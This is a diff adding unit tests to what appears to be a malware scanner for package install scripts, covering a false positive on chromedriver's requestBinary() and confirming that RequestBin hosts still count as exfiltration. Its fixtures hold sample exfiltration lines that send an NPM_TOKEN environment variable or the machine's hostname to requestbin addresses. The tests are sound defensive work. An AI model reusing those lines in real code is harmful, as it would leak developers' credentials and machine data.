@@ -155,6 +155,32 @@ class HostAndAddressTests(unittest.TestCase):
                 self.assertEqual(on_import(text)[0], [])
 
 
+class RequestBinTests(unittest.TestCase):
+    """RequestBin counts by its host names only: chromedriver's and
+    phantomjs-prebuilt's installers define requestBinary() to download their
+    binaries, and the bare word made each an exfiltration address (0.1.7), so
+    their install hooks were CRITICAL and the guard blocked chromedriver."""
+
+    def test_request_binary_is_not_requestbin(self):
+        installer = ("const request = require('request');\n"
+                     "function requestBinary(requestOptions, filePath) {\n"
+                     "  return new Promise((resolve) => request(requestOptions).pipe(fs.createWriteStream(filePath)));\n}\n"
+                     "requestBinary(getRequestOptions(), downloadedFile).then(extractDownload);\n")
+        self.assertEqual(core.install_script_risk(installer), [])
+        self.assertEqual(core.capture_service(installer), None)
+
+    def test_its_addresses_still_count(self):
+        for host in ("requestbin.com", "enx1.x.requestbin.net", "requestbin.io", "requestb.in"):
+            with self.subTest(host):
+                text = f"const https = require('https');\nhttps.get('https://{host}/r/abc?d=' + process.env.NPM_TOKEN);\n"
+                self.assertEqual(core.install_script_risk(text),
+                                 [f"contacts an address typical of data exfiltration ({host.split('x.')[-1]})"])
+        beacon = ("import socket, requests\n"
+                  "requests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n")
+        self.assertEqual(on_import(beacon), (["sends the machine's user or host name to a data-capture service "
+                                              "(requestbin.net)"], "CRITICAL"))
+
+
 class EnvironmentCopyTests(unittest.TestCase):
     def test_a_copy_of_the_environment_serialized(self):
         text = ("import os\nimport urllib.request\nimport urllib.parse\n\ndef run_payload():\n"
